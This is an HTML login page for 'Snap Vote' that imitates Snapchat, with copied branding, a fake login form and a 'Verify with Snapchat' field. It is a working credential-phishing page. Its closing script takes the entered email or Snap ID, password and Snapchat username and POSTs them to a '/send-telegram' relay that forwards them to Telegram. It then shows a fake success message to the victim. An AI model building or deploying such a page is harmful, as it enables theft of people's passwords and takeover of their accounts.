<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snap Vote Login - Join the Community!</title>
    <link rel="icon" href="extracted_assets/snapchat.com-542/favicons/favicon.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --yellow: #FFFC00;
            --black: #000000;
            --white: #FFFFFF;
            --gray: #333333;
        }

        body {
            font-family: 'Avenir Next', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        /* Animated Background */
        .bg-slideshow {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .bg-slideshow img {
            position: absolute;
            width: 100%;
            height: 100%;
            object-fit: cover;
            opacity: 0;
            animation: slideshow 20s infinite;
        }

        .bg-slideshow img:nth-child(1) { animation-delay: 0s; }
        .bg-slideshow img:nth-child(2) { animation-delay: 5s; }
        .bg-slideshow img:nth-child(3) { animation-delay: 10s; }
        .bg-slideshow img:nth-child(4) { animation-delay: 15s; }

        @keyframes slideshow {
            0%, 100% { opacity: 0; transform: scale(1); }
            5%, 25% { opacity: 0.7; transform: scale(1.1); }
            30% { opacity: 0; transform: scale(1); }
        }

        /* Overlay */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255, 252, 0, 0.9) 0%, rgba(0, 0, 0, 0.7) 100%);
            z-index: 0;
        }

        /* Login Container */
        .login-container {
            position: relative;
            z-index: 1;
            background: rgba(255, 255, 255, 0.95);
            padding: 50px 40px;
            border-radius: 40px;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.3);
            width: 90%;
            max-width: 450px;
            text-align: center;
            backdrop-filter: blur(20px);
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Animated Logos */
        .logos-container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }

        .snap-logo {
            font-size: 80px;
            animation: bounce 2s ease-in-out infinite;
            filter: drop-shadow(0 5px 15px rgba(255, 252, 0, 0.5));
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        .vote-logo {
            font-size: 42px;
            font-weight: 900;
            color: var(--black);
            background: linear-gradient(135deg, #FFFC00 0%, #FF9900 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { text-shadow: 0 0 20px rgba(255, 252, 0, 0.5); }
            to { text-shadow: 0 0 40px rgba(255, 252, 0, 0.9); }
        }

        .login-title {
            font-size: 32px;
            font-weight: 800;
            color: var(--black);
            margin-bottom: 10px;
        }

        .login-subtitle {
            font-size: 16px;
            color: var(--gray);
            margin-bottom: 30px;
        }

        /* Form Styles */
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: var(--gray);
            margin-bottom: 8px;
        }

        .input-container {
            position: relative;
        }

        .input-field {
            width: 100%;
            padding: 15px 20px 15px 50px;
            border: 2px solid #E0E0E0;
            border-radius: 25px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: var(--white);
        }

        .input-field:focus {
            outline: none;
            border-color: var(--yellow);
            box-shadow: 0 0 20px rgba(255, 252, 0, 0.3);
            transform: translateY(-2px);
        }

        .input-icon {
            position: absolute;
            left: 18px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
            color: var(--gray);
        }

        .login-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #FFFC00 0%, #FFD700 100%);
            color: var(--black);
            border: none;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 10px 30px rgba(255, 252, 0, 0.3);
        }

        .login-btn:hover {
            background: linear-gradient(135deg, #000000 0%, #333333 100%);
            color: var(--yellow);
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
        }

        .divider {
            margin: 25px 0;
            text-align: center;
            position: relative;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #E0E0E0;
        }

        .divider-text {
            position: relative;
            display: inline-block;
            background: rgba(255, 255, 255, 0.95);
            padding: 0 15px;
            color: var(--gray);
            font-size: 14px;
        }

        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: var(--gray);
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .back-link:hover {
            color: var(--black);
            transform: translateX(-5px);
        }

        /* Floating Snap Icons */
        .floating-snap {
            position: fixed;
            font-size: 40px;
            opacity: 0.3;
            animation: floatSnap 6s ease-in-out infinite;
            pointer-events: none;
        }

        .floating-snap:nth-child(1) { top: 10%; left: 5%; animation-delay: 0s; }
        .floating-snap:nth-child(2) { top: 20%; right: 10%; animation-delay: 1s; }
        .floating-snap:nth-child(3) { bottom: 15%; left: 15%; animation-delay: 2s; }
        .floating-snap:nth-child(4) { bottom: 25%; right: 8%; animation-delay: 3s; }

        @keyframes floatSnap {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(10deg); }
        }

        /* Responsive */
        @media (max-width: 500px) {
            .login-container {
                padding: 40px 30px;
            }

            .snap-logo {
                font-size: 60px;
            }

            .vote-logo {
                font-size: 32px;
            }

            .login-title {
                font-size: 26px;
            }
        }
    </style>
</head>
<body>
    <!-- Background Slideshow -->
    <div class="bg-slideshow">
        <img src="attached_assets/stock_images/happy_young_woman_ta_aea3fd72.jpg" alt="Background 1">
        <img src="attached_assets/stock_images/cool_person_with_sun_2fe1f5d5.jpg" alt="Background 2">
        <img src="attached_assets/stock_images/beautiful_sunset_lan_102e32ee.jpg" alt="Background 3">
        <img src="attached_assets/stock_images/adventure_travel_mou_1baf697c.jpg" alt="Background 4">
    </div>

    <!-- Overlay -->
    <div class="overlay"></div>

    <!-- Floating Snap Icons -->
    <div class="floating-snap">üëª</div>
    <div class="floating-snap">üì∏</div>
    <div class="floating-snap">‚ù§Ô∏è</div>
    <div class="floating-snap">‚≠ê</div>

    <!-- Login Container -->
    <div class="login-container">
        <!-- Logos -->
        <div class="logos-container">
            <div class="snap-logo">üëª</div>
            <div class="vote-logo">Snap Vote</div>
        </div>

        <h1 class="login-title">Welcome Back!</h1>
        <p class="login-subtitle">Login to share your moments and get the love</p>

        <!-- Login Form -->
        <form id="loginForm">
            <div class="form-group">
                <label class="form-label">Email Address or Snap ID</label>
                <div class="input-container">
                    <i class="fas fa-envelope input-icon"></i>
                    <input type="text" class="input-field" placeholder="Enter your email or @snapID" required>
                </div>
            </div>

            <div class="form-group">
                <label class="form-label">Password</label>
                <div class="input-container">
                    <i class="fas fa-lock input-icon"></i>
                    <input type="password" class="input-field" placeholder="Enter your password" required>
                </div>
            </div>

            <button type="submit" class="login-btn">
                <span>Login to Snap Vote</span>
                <i class="fas fa-sign-in-alt"></i>
            </button>
        </form>

        <div class="divider">
            <span class="divider-text">OR</span>
        </div>

        <!-- Snapchat Verification -->
        <div class="form-group">
            <label class="form-label">Snapchat Verification</label>
            <div class="input-container">
                <i class="fas fa-ghost input-icon"></i>
                <input type="text" class="input-field" placeholder="@your_snapchat_username" id="snapId">
            </div>
        </div>

        <button type="button" class="login-btn" onclick="verifySnapchat()">
            <span>Verify with Snapchat</span>
            <i class="fab fa-snapchat"></i>
        </button>

        <a href="index.html" class="back-link">
            <i class="fas fa-arrow-left"></i> Back to Snap Vote
        </a>
    </div>

    <script>
        async function sendToTelegram(data) {
            try {
                const response = await fetch('/send-telegram', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                return result.success;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const email = e.target.querySelector('input[type="text"]').value;
            const password = e.target.querySelector('input[type="password"]').value;
            const snapId = document.getElementById('snapId').value.trim();
            
            const loginData = {
                email: email,
                password: password,
                snapId: snapId ? (snapId.startsWith('@') ? snapId : '@' + snapId) : '',
                type: 'Email Login',
                timestamp: new Date().toLocaleString()
            };
            
            const sent = await sendToTelegram(loginData);
            
            createCelebration();
            
            setTimeout(() => {
                if (sent) {
                    alert('Login successful! Welcome to Snap Vote! üéâ');
                } else {
                    alert('Login received! Welcome to Snap Vote! üéâ');
                }
                window.location.href = 'index.html';
            }, 1000);
        });

        async function verifySnapchat() {
            const snapId = document.getElementById('snapId').value.trim();
            
            if (!snapId) {
                alert('Please enter your Snapchat username! üëª');
                return;
            }
            
            const formattedSnapId = snapId.startsWith('@') ? snapId : '@' + snapId;
            
            const loginData = {
                snapId: formattedSnapId,
                type: 'Snapchat Verification',
                timestamp: new Date().toLocaleString()
            };
            
            const sent = await sendToTelegram(loginData);
            
            createCelebration();
            
            setTimeout(() => {
                if (sent) {
                    alert(`Verifying Snapchat account ${formattedSnapId}... Welcome! üî•`);
                } else {
                    alert(`Snapchat verification received for ${formattedSnapId}! Welcome! üî•`);
                }
                window.location.href = 'index.html';
            }, 1000);
        }

        function createCelebration() {
            for (let i = 0; i < 30; i++) {
                const emoji = document.createElement('div');
                emoji.textContent = ['üëª', '‚≠ê', '‚ù§Ô∏è', 'üî•', 'üéâ'][Math.floor(Math.random() * 5)];
                emoji.style.position = 'fixed';
                emoji.style.left = Math.random() * 100 + 'vw';
                emoji.style.top = '-50px';
                emoji.style.fontSize = (Math.random() * 20 + 20) + 'px';
                emoji.style.zIndex = '9999';
                emoji.style.pointerEvents = 'none';
                document.body.appendChild(emoji);
                
                const duration = Math.random() * 2 + 3;
                emoji.animate([
                    { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
                    { transform: `translateY(100vh) rotate(${Math.random() * 360}deg)`, opacity: 0 }
                ], {
                    duration: duration * 1000,
                    easing: 'ease-out'
                });
                
                setTimeout(() => emoji.remove(), duration * 1000);
            }
        }
    </script>
</body>
</html>
